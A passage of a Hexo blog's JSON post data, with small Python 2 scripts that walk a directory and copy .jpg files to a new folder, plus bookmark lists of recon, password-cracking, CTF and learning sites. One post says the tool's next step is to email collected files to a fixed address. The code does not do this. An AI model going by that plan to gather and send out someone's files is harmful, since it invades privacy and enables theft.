sign:bman","slug":"python小工具-图片收集","published":1,"updated":"2017-06-02T01:03:48.740Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g1280009joo53yi2mihi","content":"<p>It’s the second step of my final instrument, this code is using to catch the picture in your computer and<br>copy it to a new fold. Waiting for my next step.</p>\n<h2 id=\"A-cup-of-tea\"><a href=\"#A-cup-of-tea\" class=\"headerlink\" title=\"A cup of tea:\"></a>A cup of tea:</h2><h3 id=\"code\"><a href=\"#code\" class=\"headerlink\" title=\"code:\"></a>code:</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env pthon</span></div><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import os, string, shutil</div><div class=\"line\"><span class=\"string\">'These code is about create a new fold and copy the .jpg to this fold'</span></div><div class=\"line\"></div><div class=\"line\">def mkdir(paths):</div><div class=\"line\"></div><div class=\"line\">    paths=paths.strip()      <span class=\"comment\"># 去除首位空格</span></div><div class=\"line\">    <span class=\"comment\"># 去除尾部 \\ 符号</span></div><div class=\"line\">    <span class=\"comment\"># paths=paths.rstrip(\"\\\\\")</span></div><div class=\"line\"> </div><div class=\"line\">    isExists=os.path.exists(paths)  <span class=\"comment\"># 判断路径是否存在，存在（True）,不存在（False）</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> not isExists:</div><div class=\"line\">        <span class=\"comment\"># 如果不存在则创建目录</span></div><div class=\"line\">        <span class=\"built_in\">print</span> paths</div><div class=\"line\">        <span class=\"comment\"># 创建目录操作函数</span></div><div class=\"line\">        os.makedirs(paths)</div><div class=\"line\">        <span class=\"built_in\">return</span> True</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"comment\"># 如果目录存在则不创建，并提示目录已存在</span></div><div class=\"line\">        <span class=\"built_in\">print</span> paths+<span class=\"string\">' Already Created'</span></div><div class=\"line\">        <span class=\"built_in\">return</span> False</div><div class=\"line\"> </div><div class=\"line\"><span class=\"comment\"># 定义要创建的目录</span></div><div class=\"line\">mkpaths=<span class=\"string\">\"e:\\\\12345678\\\\\"</span></div><div class=\"line\"><span class=\"comment\">#调用函数生成目录</span></div><div class=\"line\">mkdir(mkpaths)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def get_imlist(path):</div><div class=\"line\">\t<span class=\"string\">'return a list of file path'</span></div><div class=\"line\">\t<span class=\"keyword\">if</span> os.path.isdir(path):</div><div class=\"line\">\t\tfiles=os.listdir(path)        <span class=\"comment\">#列出文件目录</span></div><div class=\"line\">\t\t<span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> files:</div><div class=\"line\">\t\t\tf=os.path.join(path,f)\t<span class=\"comment\">#关联文件和目录，形成路径</span></div><div class=\"line\">\t\t\tget_imlist(f)</div><div class=\"line\">\t<span class=\"keyword\">elif</span> os.path.isfile(path):</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> path.endswith(<span class=\"string\">'.jpg'</span>):\t<span class=\"comment\">#判断文件名为.jpg结尾的文件</span></div><div class=\"line\">\t\t\t<span class=\"built_in\">print</span> path</div><div class=\"line\">\t\t\tfname=os.path.basename(path)    <span class=\"comment\">#返回文件名</span></div><div class=\"line\">\t\t\tnew_f=mkpaths+fname\t\t\t\t<span class=\"comment\">#在mkpath目录下创建相应文件</span></div><div class=\"line\">\t\t\tshutil.copyfile(path,new_f)\t\t<span class=\"comment\">#从path文件复制数据到new_f</span></div><div class=\"line\"></div><div class=\"line\">path = raw_input(<span class=\"string\">\"Enter path: \"</span>)</div><div class=\"line\">get_imlist(path)</div></pre></td></tr></table></figure>\n<p><img src=\"/upload_image/lu22.jpg\" alt=\"鹿神\"></p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>","site":{"data":{}},"excerpt":"","more":"<p>It’s the second step of my final instrument, this code is using to catch the picture in your computer and<br>copy it to a new fold. Waiting for my next step.</p>\n<h2 id=\"A-cup-of-tea\"><a href=\"#A-cup-of-tea\" class=\"headerlink\" title=\"A cup of tea:\"></a>A cup of tea:</h2><h3 id=\"code\"><a href=\"#code\" class=\"headerlink\" title=\"code:\"></a>code:</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env pthon</span></div><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import os, string, shutil</div><div class=\"line\"><span class=\"string\">'These code is about create a new fold and copy the .jpg to this fold'</span></div><div class=\"line\"></div><div class=\"line\">def mkdir(paths):</div><div class=\"line\"></div><div class=\"line\">    paths=paths.strip()      <span class=\"comment\"># 去除首位空格</span></div><div class=\"line\">    <span class=\"comment\"># 去除尾部 \\ 符号</span></div><div class=\"line\">    <span class=\"comment\"># paths=paths.rstrip(\"\\\\\")</span></div><div class=\"line\"> </div><div class=\"line\">    isExists=os.path.exists(paths)  <span class=\"comment\"># 判断路径是否存在，存在（True）,不存在（False）</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> not isExists:</div><div class=\"line\">        <span class=\"comment\"># 如果不存在则创建目录</span></div><div class=\"line\">        <span class=\"built_in\">print</span> paths</div><div class=\"line\">        <span class=\"comment\"># 创建目录操作函数</span></div><div class=\"line\">        os.makedirs(paths)</div><div class=\"line\">        <span class=\"built_in\">return</span> True</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"comment\"># 如果目录存在则不创建，并提示目录已存在</span></div><div class=\"line\">        <span class=\"built_in\">print</span> paths+<span class=\"string\">' Already Created'</span></div><div class=\"line\">        <span class=\"built_in\">return</span> False</div><div class=\"line\"> </div><div class=\"line\"><span class=\"comment\"># 定义要创建的目录</span></div><div class=\"line\">mkpaths=<span class=\"string\">\"e:\\\\12345678\\\\\"</span></div><div class=\"line\"><span class=\"comment\">#调用函数生成目录</span></div><div class=\"line\">mkdir(mkpaths)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def get_imlist(path):</div><div class=\"line\">\t<span class=\"string\">'return a list of file path'</span></div><div class=\"line\">\t<span class=\"keyword\">if</span> os.path.isdir(path):</div><div class=\"line\">\t\tfiles=os.listdir(path)        <span class=\"comment\">#列出文件目录</span></div><div class=\"line\">\t\t<span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> files:</div><div class=\"line\">\t\t\tf=os.path.join(path,f)\t<span class=\"comment\">#关联文件和目录，形成路径</span></div><div class=\"line\">\t\t\tget_imlist(f)</div><div class=\"line\">\t<span class=\"keyword\">elif</span> os.path.isfile(path):</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> path.endswith(<span class=\"string\">'.jpg'</span>):\t<span class=\"comment\">#判断文件名为.jpg结尾的文件</span></div><div class=\"line\">\t\t\t<span class=\"built_in\">print</span> path</div><div class=\"line\">\t\t\tfname=os.path.basename(path)    <span class=\"comment\">#返回文件名</span></div><div class=\"line\">\t\t\tnew_f=mkpaths+fname\t\t\t\t<span class=\"comment\">#在mkpath目录下创建相应文件</span></div><div class=\"line\">\t\t\tshutil.copyfile(path,new_f)\t\t<span class=\"comment\">#从path文件复制数据到new_f</span></div><div class=\"line\"></div><div class=\"line\">path = raw_input(<span class=\"string\">\"Enter path: \"</span>)</div><div class=\"line\">get_imlist(path)</div></pre></td></tr></table></figure>\n<p><img src=\"/upload_image/lu22.jpg\" alt=\"鹿神\"></p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>"},{"title":"python小工具--遍历","date":"2016-09-28T10:36:45.000Z","_content":"The uses of this tool is about directory traversal, include varies of file type.As you know, the next step is to download these files, and email it to a direct address, that's wonderful.\n工具作用为遍历电脑中指定目录中的所有文件及其路径，可以通过修改源码来指定所遍历的文件类型。\n![鹿神](/upload_image/lu.jpg)\n## Caffee first\n### Traverse image\n``` bash\n#!/usr/bin/env python\n#coding=utf-8\n\nimport os\n\ndef get_imlist(path):\n\t'return a list of file path'\n\tif os.path.isdir(path):\n\t\tfiles=os.listdir(path)\n\t\tfor f in files:\n\t\t\tf=os.path.join(path,f)\n\t\t\tget_imlist(f)\n\telif os.path.isfile(path):\n\t\tif path.endswith('.jpg'):\n\t\t\tprint path\n```\n\n\n### sign:Bman\n","source":"_posts/python小工具-遍历.md","raw":"---\ntitle: python小工具--遍历\ndate: 2016-09-28 18:36:45\ntags:\n---\nThe uses of this tool is about directory traversal, include varies of file type.As you know, the next step is to download these files, and email it to a direct address, that's wonderful.\n工具作用为遍历电脑中指定目录中的所有文件及其路径，可以通过修改源码来指定所遍历的文件类型。\n![鹿神](/upload_image/lu.jpg)\n## Caffee first\n### Traverse image\n``` bash\n#!/usr/bin/env python\n#coding=utf-8\n\nimport os\n\ndef get_imlist(path):\n\t'return a list of file path'\n\tif os.path.isdir(path):\n\t\tfiles=os.listdir(path)\n\t\tfor f in files:\n\t\t\tf=os.path.join(path,f)\n\t\t\tget_imlist(f)\n\telif os.path.isfile(path):\n\t\tif path.endswith('.jpg'):\n\t\t\tprint path\n```\n\n\n### sign:Bman\n","slug":"python小工具-遍历","published":1,"updated":"2017-06-02T01:04:04.832Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g12c000ajoo5dsek4sfr","content":"<p>The uses of this tool is about directory traversal, include varies of file type.As you know, the next step is to download these files, and email it to a direct address, that’s wonderful.<br>工具作用为遍历电脑中指定目录中的所有文件及其路径，可以通过修改源码来指定所遍历的文件类型。<br><img src=\"/upload_image/lu.jpg\" alt=\"鹿神\"></p>\n<h2 id=\"Caffee-first\"><a href=\"#Caffee-first\" class=\"headerlink\" title=\"Caffee first\"></a>Caffee first</h2><h3 id=\"Traverse-image\"><a href=\"#Traverse-image\" class=\"headerlink\" title=\"Traverse image\"></a>Traverse image</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import os</div><div class=\"line\"></div><div class=\"line\">def get_imlist(path):</div><div class=\"line\">\t<span class=\"string\">'return a list of file path'</span></div><div class=\"line\">\t<span class=\"keyword\">if</span> os.path.isdir(path):</div><div class=\"line\">\t\tfiles=os.listdir(path)</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> files:</div><div class=\"line\">\t\t\tf=os.path.join(path,f)</div><div class=\"line\">\t\t\tget_imlist(f)</div><div class=\"line\">\t<span class=\"keyword\">elif</span> os.path.isfile(path):</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> path.endswith(<span class=\"string\">'.jpg'</span>):</div><div class=\"line\">\t\t\t<span class=\"built_in\">print</span> path</div></pre></td></tr></table></figure>\n<h3 id=\"sign-Bman\"><a href=\"#sign-Bman\" class=\"headerlink\" title=\"sign:Bman\"></a>sign:Bman</h3>","site":{"data":{}},"excerpt":"","more":"<p>The uses of this tool is about directory traversal, include varies of file type.As you know, the next step is to download these files, and email it to a direct address, that’s wonderful.<br>工具作用为遍历电脑中指定目录中的所有文件及其路径，可以通过修改源码来指定所遍历的文件类型。<br><img src=\"/upload_image/lu.jpg\" alt=\"鹿神\"></p>\n<h2 id=\"Caffee-first\"><a href=\"#Caffee-first\" class=\"headerlink\" title=\"Caffee first\"></a>Caffee first</h2><h3 id=\"Traverse-image\"><a href=\"#Traverse-image\" class=\"headerlink\" title=\"Traverse image\"></a>Traverse image</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import os</div><div class=\"line\"></div><div class=\"line\">def get_imlist(path):</div><div class=\"line\">\t<span class=\"string\">'return a list of file path'</span></div><div class=\"line\">\t<span class=\"keyword\">if</span> os.path.isdir(path):</div><div class=\"line\">\t\tfiles=os.listdir(path)</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> f <span class=\"keyword\">in</span> files:</div><div class=\"line\">\t\t\tf=os.path.join(path,f)</div><div class=\"line\">\t\t\tget_imlist(f)</div><div class=\"line\">\t<span class=\"keyword\">elif</span> os.path.isfile(path):</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> path.endswith(<span class=\"string\">'.jpg'</span>):</div><div class=\"line\">\t\t\t<span class=\"built_in\">print</span> path</div></pre></td></tr></table></figure>\n<h3 id=\"sign-Bman\"><a href=\"#sign-Bman\" class=\"headerlink\" title=\"sign:Bman\"></a>sign:Bman</h3>"},{"title":"书签网址1-->社工库","date":"2017-02-07T08:14:25.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 社工库\n[md5密码在线破解](http://www.cmd5.com/default.aspx?hashtype=md5&answer=d3ptc2p3Yw%3d%3d)\n\n[ZoomEye](https://www.zoomeye.org/)\n\n[美橙互联](http://www.cndns.com/whois/index.aspx)\n\n[站长之家-Whois查询](http://whois.chinaz.com/)\n\n[123CHA!](http://www.123cha.com)\n\n[NOSEC大数据](https://nosec.org)\n\n[吾爱破解](http://www.52pojie.cn/)\n\n[html加密解密](http://www.521yy.com/tools/cryptogram.htm)\n\n[华为安全中心平台](http://sec.huawei.com/sec/web/queryIntelligence.do)\n\n[安犬-漏洞扫描](https://www.aqdog.com/)\n\n[站长帮手-子域名查询](http://i.links.cn/subdomain/)\n\n[360网站安全检测-在线检测](http://webscan.360.cn/#)\n\n[FOFA查询](https://fofa.so/)\n\n[IP138查询](http://www.ip138.com)\n\n[crimeflare查询](http://www.crimeflare.com)网站IP加入cloudflare历史记录查询\n\n[Websec网络安全导航](http://nav.mayter.cn)\n","source":"_posts/书签网址--社工库.md","raw":"---\ntitle: 书签网址1-->社工库\ndate: 2017-02-07 16:14:25\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 社工库\n[md5密码在线破解](http://www.cmd5.com/default.aspx?hashtype=md5&answer=d3ptc2p3Yw%3d%3d)\n\n[ZoomEye](https://www.zoomeye.org/)\n\n[美橙互联](http://www.cndns.com/whois/index.aspx)\n\n[站长之家-Whois查询](http://whois.chinaz.com/)\n\n[123CHA!](http://www.123cha.com)\n\n[NOSEC大数据](https://nosec.org)\n\n[吾爱破解](http://www.52pojie.cn/)\n\n[html加密解密](http://www.521yy.com/tools/cryptogram.htm)\n\n[华为安全中心平台](http://sec.huawei.com/sec/web/queryIntelligence.do)\n\n[安犬-漏洞扫描](https://www.aqdog.com/)\n\n[站长帮手-子域名查询](http://i.links.cn/subdomain/)\n\n[360网站安全检测-在线检测](http://webscan.360.cn/#)\n\n[FOFA查询](https://fofa.so/)\n\n[IP138查询](http://www.ip138.com)\n\n[crimeflare查询](http://www.crimeflare.com)网站IP加入cloudflare历史记录查询\n\n[Websec网络安全导航](http://nav.mayter.cn)\n","slug":"书签网址--社工库","published":1,"updated":"2017-05-31T07:58:06.619Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g12e000bjoo5ual44qzj","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h3><p><a href=\"http://www.cmd5.com/default.aspx?hashtype=md5&amp;answer=d3ptc2p3Yw%3d%3d\" target=\"_blank\" rel=\"external\">md5密码在线破解</a></p>\n<p><a href=\"https://www.zoomeye.org/\" target=\"_blank\" rel=\"external\">ZoomEye</a></p>\n<p><a href=\"http://www.cndns.com/whois/index.aspx\" target=\"_blank\" rel=\"external\">美橙互联</a></p>\n<p><a href=\"http://whois.chinaz.com/\" target=\"_blank\" rel=\"external\">站长之家-Whois查询</a></p>\n<p><a href=\"http://www.123cha.com\" target=\"_blank\" rel=\"external\">123CHA!</a></p>\n<p><a href=\"https://nosec.org\" target=\"_blank\" rel=\"external\">NOSEC大数据</a></p>\n<p><a href=\"http://www.52pojie.cn/\" target=\"_blank\" rel=\"external\">吾爱破解</a></p>\n<p><a href=\"http://www.521yy.com/tools/cryptogram.htm\" target=\"_blank\" rel=\"external\">html加密解密</a></p>\n<p><a href=\"http://sec.huawei.com/sec/web/queryIntelligence.do\" target=\"_blank\" rel=\"external\">华为安全中心平台</a></p>\n<p><a href=\"https://www.aqdog.com/\" target=\"_blank\" rel=\"external\">安犬-漏洞扫描</a></p>\n<p><a href=\"http://i.links.cn/subdomain/\" target=\"_blank\" rel=\"external\">站长帮手-子域名查询</a></p>\n<p><a href=\"http://webscan.360.cn/#\" target=\"_blank\" rel=\"external\">360网站安全检测-在线检测</a></p>\n<p><a href=\"https://fofa.so/\" target=\"_blank\" rel=\"external\">FOFA查询</a></p>\n<p><a href=\"http://www.ip138.com\" target=\"_blank\" rel=\"external\">IP138查询</a></p>\n<p><a href=\"http://www.crimeflare.com\" target=\"_blank\" rel=\"external\">crimeflare查询</a>网站IP加入cloudflare历史记录查询</p>\n<p><a href=\"http://nav.mayter.cn\" target=\"_blank\" rel=\"external\">Websec网络安全导航</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h3><p><a href=\"http://www.cmd5.com/default.aspx?hashtype=md5&amp;answer=d3ptc2p3Yw%3d%3d\" target=\"_blank\" rel=\"external\">md5密码在线破解</a></p>\n<p><a href=\"https://www.zoomeye.org/\" target=\"_blank\" rel=\"external\">ZoomEye</a></p>\n<p><a href=\"http://www.cndns.com/whois/index.aspx\" target=\"_blank\" rel=\"external\">美橙互联</a></p>\n<p><a href=\"http://whois.chinaz.com/\" target=\"_blank\" rel=\"external\">站长之家-Whois查询</a></p>\n<p><a href=\"http://www.123cha.com\" target=\"_blank\" rel=\"external\">123CHA!</a></p>\n<p><a href=\"https://nosec.org\" target=\"_blank\" rel=\"external\">NOSEC大数据</a></p>\n<p><a href=\"http://www.52pojie.cn/\" target=\"_blank\" rel=\"external\">吾爱破解</a></p>\n<p><a href=\"http://www.521yy.com/tools/cryptogram.htm\" target=\"_blank\" rel=\"external\">html加密解密</a></p>\n<p><a href=\"http://sec.huawei.com/sec/web/queryIntelligence.do\" target=\"_blank\" rel=\"external\">华为安全中心平台</a></p>\n<p><a href=\"https://www.aqdog.com/\" target=\"_blank\" rel=\"external\">安犬-漏洞扫描</a></p>\n<p><a href=\"http://i.links.cn/subdomain/\" target=\"_blank\" rel=\"external\">站长帮手-子域名查询</a></p>\n<p><a href=\"http://webscan.360.cn/#\" target=\"_blank\" rel=\"external\">360网站安全检测-在线检测</a></p>\n<p><a href=\"https://fofa.so/\" target=\"_blank\" rel=\"external\">FOFA查询</a></p>\n<p><a href=\"http://www.ip138.com\" target=\"_blank\" rel=\"external\">IP138查询</a></p>\n<p><a href=\"http://www.crimeflare.com\" target=\"_blank\" rel=\"external\">crimeflare查询</a>网站IP加入cloudflare历史记录查询</p>\n<p><a href=\"http://nav.mayter.cn\" target=\"_blank\" rel=\"external\">Websec网络安全导航</a></p>\n"},{"title":"书签网址3-->视频","date":"2017-02-08T01:56:07.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 视频学习\n[麦子学院](http://www.maiziedu.com)\t\t[i春秋学院](http://www.ichunqiucom)\t\t[coursera](https://www.coursera.org)\n\n[百度传课](http://www.chuanke.com)\t\t[小刀免费资源分享](http://www.xiaodao.la)\t[B站](http://www.bilibili.com)","source":"_posts/书签网址--视频.md","raw":"---\ntitle: 书签网址3-->视频\ndate: 2017-02-08 09:56:07\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 视频学习\n[麦子学院](http://www.maiziedu.com)\t\t[i春秋学院](http://www.ichunqiucom)\t\t[coursera](https://www.coursera.org)\n\n[百度传课](http://www.chuanke.com)\t\t[小刀免费资源分享](http://www.xiaodao.la)\t[B站](http://www.bilibili.com)","slug":"书签网址--视频","published":1,"updated":"2017-06-01T09:52:09.221Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g12i000cjoo5vtvdct7s","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"视频学习\"><a href=\"#视频学习\" class=\"headerlink\" title=\"视频学习\"></a>视频学习</h3><p><a href=\"http://www.maiziedu.com\" target=\"_blank\" rel=\"external\">麦子学院</a>        <a href=\"http://www.ichunqiucom\" target=\"_blank\" rel=\"external\">i春秋学院</a>        <a href=\"https://www.coursera.org\" target=\"_blank\" rel=\"external\">coursera</a></p>\n<p><a href=\"http://www.chuanke.com\" target=\"_blank\" rel=\"external\">百度传课</a>        <a href=\"http://www.xiaodao.la\" target=\"_blank\" rel=\"external\">小刀免费资源分享</a>    <a href=\"http://www.bilibili.com\" target=\"_blank\" rel=\"external\">B站</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"视频学习\"><a href=\"#视频学习\" class=\"headerlink\" title=\"视频学习\"></a>视频学习</h3><p><a href=\"http://www.maiziedu.com\" target=\"_blank\" rel=\"external\">麦子学院</a>        <a href=\"http://www.ichunqiucom\" target=\"_blank\" rel=\"external\">i春秋学院</a>        <a href=\"https://www.coursera.org\" target=\"_blank\" rel=\"external\">coursera</a></p>\n<p><a href=\"http://www.chuanke.com\" target=\"_blank\" rel=\"external\">百度传课</a>        <a href=\"http://www.xiaodao.la\" target=\"_blank\" rel=\"external\">小刀免费资源分享</a>    <a href=\"http://www.bilibili.com\" target=\"_blank\" rel=\"external\">B站</a></p>\n"},{"title":"书签网址8-->CTF","date":"2017-02-08T05:45:33.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n[IDF-CTF训练营](http://ctf.idf.cn/)\t\t[Github-CTF资料](https://github.com/ctfs)\t[ASCII编码转换](http://tool.chinaz.com/Tools/native_ascii.aspx)\n\n[摩斯密码翻译](http://mathsking.net/morse.htm)\t\t[栅栏密码](http://baike.baidu.com/view/710257.htm)","source":"_posts/书签网址-CTF.md","raw":"---\ntitle: 书签网址8-->CTF\ndate: 2017-02-08 13:45:33\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n[IDF-CTF训练营](http://ctf.idf.cn/)\t\t[Github-CTF资料](https://github.com/ctfs)\t[ASCII编码转换](http://tool.chinaz.com/Tools/native_ascii.aspx)\n\n[摩斯密码翻译](http://mathsking.net/morse.htm)\t\t[栅栏密码](http://baike.baidu.com/view/710257.htm)","slug":"书签网址-CTF","published":1,"updated":"2017-06-01T09:52:58.288Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g12m000djoo5hx6kr870","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）<br><a href=\"http://ctf.idf.cn/\" target=\"_blank\" rel=\"external\">IDF-CTF训练营</a>        <a href=\"https://github.com/ctfs\" target=\"_blank\" rel=\"external\">Github-CTF资料</a>    <a href=\"http://tool.chinaz.com/Tools/native_ascii.aspx\" target=\"_blank\" rel=\"external\">ASCII编码转换</a></p>\n<p><a href=\"http://mathsking.net/morse.htm\" target=\"_blank\" rel=\"external\">摩斯密码翻译</a>        <a href=\"http://baike.baidu.com/view/710257.htm\" target=\"_blank\" rel=\"external\">栅栏密码</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）<br><a href=\"http://ctf.idf.cn/\" target=\"_blank\" rel=\"external\">IDF-CTF训练营</a>        <a href=\"https://github.com/ctfs\" target=\"_blank\" rel=\"external\">Github-CTF资料</a>    <a href=\"http://tool.chinaz.com/Tools/native_ascii.aspx\" target=\"_blank\" rel=\"external\">ASCII编码转换</a></p>\n<p><a href=\"http://mathsking.net/morse.htm\" target=\"_blank\" rel=\"external\">摩斯密码翻译</a>        <a href=\"http://baike.baidu.com/view/710257.htm\" target=\"_blank\" rel=\"external\">栅栏密码</a></p>\n"},{"title":"书签网址-->blog","date":"2017-06-01T09:44:19.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 视频学习\n[百度网盘限速绕过](http://www.runningcheese.com/baiduyun)\t[博客索引站](http://blog.binklac.com/links/)\t[aullik5微博](http://weibo.com/u/1707085527?is_all=1)\n\n[攻防工具](http://www.mamicode.com/info-detail-1150231.html)\t[ZombieBoy's Blog](http://www.njstu.net/)\t[聂扬帆博客](http://www.jianshu.com/p/ad44231aff32)\n\n[voovode博客](https://voovode.net/)\t\t[逆向初学](http://blog.chinaunix.net/uid-26275986-id-4333402.html)\n","source":"_posts/书签网址-blog.md","raw":"---\ntitle: 书签网址-->blog\ndate: 2017-06-01 17:44:19\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 视频学习\n[百度网盘限速绕过](http://www.runningcheese.com/baiduyun)\t[博客索引站](http://blog.binklac.com/links/)\t[aullik5微博](http://weibo.com/u/1707085527?is_all=1)\n\n[攻防工具](http://www.mamicode.com/info-detail-1150231.html)\t[ZombieBoy's 